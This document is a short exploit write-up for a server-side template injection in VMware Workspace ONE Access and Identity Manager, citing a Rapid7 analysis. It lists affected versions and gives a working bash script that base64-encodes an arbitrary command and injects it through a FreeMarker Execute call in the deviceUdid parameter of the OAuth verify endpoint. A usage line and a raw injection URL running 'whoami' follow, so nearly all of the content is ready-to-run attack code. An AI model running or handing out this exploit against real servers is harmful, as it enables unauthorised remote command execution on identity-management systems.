### Affected systems
```
VMware Workspace ONE Access (Access) 20.10.0.0 – 20.10.0.1, 21.08.0.0 – 21.08.0.1
VMware Identity Manager (vIDM) 3.3.3 – 3.3.6
```

### Exploit code for server-side template injection
```
#!/bin/bash

set -euo pipefail
die () {
    echo >&2 "$@"
    exit 1
}

[ "$#" -eq 2 ] || die "Usage: $0 <target> <cmd>"

# Encode the CMD as Base64 to avoid spaces
ENCODED_CMD=$(echo "echo XYZ;$2;echo ZYX" | base64 -w0)

# Build the argument string based on Will Vu's public PoC
ARGS='deviceUdid=${"freemarker.template.utility.Execute"?new()("bash -c {eval,$({echo,'$(echo $ENCODED_CMD)'}|{base64,-d})}")}'

# Get the curl response
OUT=$(curl -sk https://$1/catalog-portal/ui/oauth/verify -H "Host: anything" -Gd error= --data-urlencode "$ARGS")

# Pull out the command result
echo $OUT | grep 'XYZ.*ZYX' | sed -re 's/.*XYZ\\n(.*)\\nZYX.*/\1/' -e 's/\\n/\n/g'
```

### Exploit
```
bash ./exploit <rhost> <command>
```

### Exploit paths
```
/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("whoami")}
```

### References
https://attackerkb.com/topics/BDXyTqY1ld/cve-2022-22954/rapid7-analysis?referrer=activityFeed

